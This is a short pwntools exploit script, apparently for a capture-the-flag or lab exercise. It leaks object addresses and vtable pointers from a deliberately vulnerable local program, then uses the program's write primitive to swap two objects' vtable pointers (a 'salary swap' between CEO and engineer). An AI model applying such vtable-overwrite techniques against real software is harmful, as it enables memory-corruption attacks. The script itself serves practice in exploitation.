#!/usr/bin/env python3
from pwn import *

p = process(["./main.exe"])
if args.D:
    context.terminal = ["tmux", "splitw", "-h"]
    gdb.attach(p, "b *main + 65")
employees = []

def leak_crucial_data():
    NUM_EMPLOYEE = 10
    for i in range(NUM_EMPLOYEE):
        p.recvuntil("employee[{}]".format(i).encode())
        leak = p.recvline()
        addr = int(leak[leak.find(b"0x"):], 16)
        employees.append({"addr": addr})

    for i in range(NUM_EMPLOYEE):
        addr = str(employees[i]["addr"]).encode()
        p.sendlineafter(b"R addr : ", addr)
        leak = p.recvline()
        leak = leak[leak.find(b"0x"):].strip()
        value = int(leak, 16)
        employees[i]["vtable"] = value
        print(value)

    p.sendlineafter(b"R addr : ", b"0")

def salary_swap_attack():
    CEO_INDEX = 0
    LUCKY_ENGINEER_INDEX = 7

    ceo_addr = employees[CEO_INDEX]["addr"]
    eng_addr = employees[LUCKY_ENGINEER_INDEX]["addr"]
    ceo_vtable = employees[CEO_INDEX]["vtable"]
    eng_vtable = employees[LUCKY_ENGINEER_INDEX]["vtable"]
    log.info("Swaping CEO({}) and Engineer({}) address".format(ceo_addr, eng_addr))

    p.sendlineafter(b"W addr : ", str(ceo_addr).encode())
    p.sendlineafter(b"W value: ", str(eng_vtable).encode())

    p.sendlineafter(b"W addr : ", str(eng_addr).encode())
    p.sendlineafter(b"W value: ", str(ceo_vtable).encode())

    p.sendlineafter(b"addr : ", b"0")
    p.interactive()

def main():
    leak_crucial_data()
    salary_swap_attack()



if __name__ == "__main__":
    main()

